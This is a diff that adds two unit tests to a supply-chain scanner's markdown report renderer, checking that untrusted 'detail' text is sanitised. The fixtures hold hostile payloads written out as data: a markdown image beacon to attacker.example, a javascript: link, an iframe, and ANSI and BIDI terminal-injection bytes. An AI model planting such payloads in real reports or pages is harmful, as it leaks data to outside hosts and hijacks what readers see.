@@ -164,6 +164,49 @@ def test_hygiene_section_rendered() -> None:
     assert "lockfile_drift" in md
 
 
+def test_hygiene_detail_strips_autofetch_markup() -> None:
+    """Supply-chain ``detail`` strings interpolate genuinely-untrusted
+    content (npm install-hook script bodies, registry-supplied
+    package names). Markdown autofetch markup like ``![](url)`` would
+    auto-fire a fetch when an operator opens the rendered report —
+    sanitise_string strips it. The same render path serves
+    hygiene + supply-chain (``_render_one_kinded_group``)."""
+    hostile = _hygiene()
+    object.__setattr__(
+        hostile, "detail",
+        "lockfile drift! ![exfil](https://attacker.example/p?ctx=) "
+        "[click](javascript:alert(1)) <iframe src='//evil/' />",
+    )
+    md = render_markdown_report(
+        target=Path("/x"),
+        deps_analysed=1,
+        vuln_findings=[],
+        hygiene_findings=[hostile],
+    )
+    assert "lockfile drift!" in md
+    assert "![" not in md, "autofetch markup must be defanged"
+    assert "javascript:" not in md
+    assert "<iframe" not in md
+
+
+def test_hygiene_detail_escapes_terminal_injection() -> None:
+    """ANSI / BIDI bytes in ``detail`` must not survive into the
+    rendered report — ``cat report.md`` shouldn't be hijack-able."""
+    hostile = _hygiene()
+    object.__setattr__(
+        hostile, "detail",
+        "harmless\x1b[31mDANGER\x1b[0m ‮text",
+    )
+    md = render_markdown_report(
+        target=Path("/x"),
+        deps_analysed=1,
+        vuln_findings=[],
+        hygiene_findings=[hostile],
+    )
+    assert "\x1b[" not in md
+    assert "‮" not in md
+
+
 def test_cache_stats_when_provided() -> None:
     md = render_markdown_report(
         target=Path("/x"),
